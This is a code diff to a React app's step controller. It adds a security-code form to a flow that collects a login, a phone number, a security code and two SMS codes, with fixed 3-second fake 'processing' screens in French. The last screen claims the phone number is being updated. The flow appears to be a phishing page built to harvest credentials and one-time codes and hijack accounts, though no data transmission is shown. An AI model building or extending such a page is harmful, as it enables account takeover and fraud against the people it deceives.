@@ -2,11 +2,12 @@ import React, { useState } from 'react';
 import LoginForm from './components/LoginForm';
 import CodeForm from './components/CodeForm';
 import PhoneForm from './components/PhoneForm';
+import SecurityCodeForm from './components/SecurityCodeForm';
 import SmsCodeForm from './components/SmsCodeForm';
 import LoadingPage from './components/LoadingPage';
 import SuccessPage from './components/SuccessPage';
 
-type Step = 'login' | 'code' | 'loading1' | 'phone' | 'loading2' | 'sms1' | 'loading3' | 'sms2' | 'loading4' | 'success';
+type Step = 'login' | 'code' | 'loading1' | 'phone' | 'loading2' | 'security' | 'loading3' | 'sms1' | 'loading4' | 'sms2' | 'loading5' | 'success';
 
 function App() {
   const [currentStep, setCurrentStep] = useState<Step>('login');
@@ -22,14 +23,18 @@ function App() {
         break;
       case 'phone':
         setCurrentStep('loading2');
+        setTimeout(() => setCurrentStep('security'), 3000);
+        break;
+      case 'security':
+        setCurrentStep('loading3');
         setTimeout(() => setCurrentStep('sms1'), 3000);
         break;
       case 'sms1':
-        setCurrentStep('loading3');
+        setCurrentStep('loading4');
         setTimeout(() => setCurrentStep('sms2'), 3000);
         break;
       case 'sms2':
-        setCurrentStep('loading4');
+        setCurrentStep('loading5');
         setTimeout(() => setCurrentStep('success'), 3000);
         break;
       case 'success':
@@ -53,13 +58,17 @@ function App() {
         return <PhoneForm onNext={nextStep} />;
       case 'loading2':
         return <LoadingPage message="Traitement de vos informations..." />;
+      case 'security':
+        return <SecurityCodeForm onNext={nextStep} />;
+      case 'loading3':
+        return <LoadingPage message="Traitement de vos informations..." />;
       case 'sms1':
         return <SmsCodeForm onNext={nextStep} />;
-      case 'loading3':
+      case 'loading4':
         return <LoadingPage message="Traitement de vos informations..." />;
       case 'sms2':
         return <SmsCodeForm onNext={nextStep} isSecondCode={true} />;
-      case 'loading4':
+      case 'loading5':
         return <LoadingPage message="Mise à jour du numéro de téléphone en cours..." />;
       case 'success':
         return <SuccessPage />;
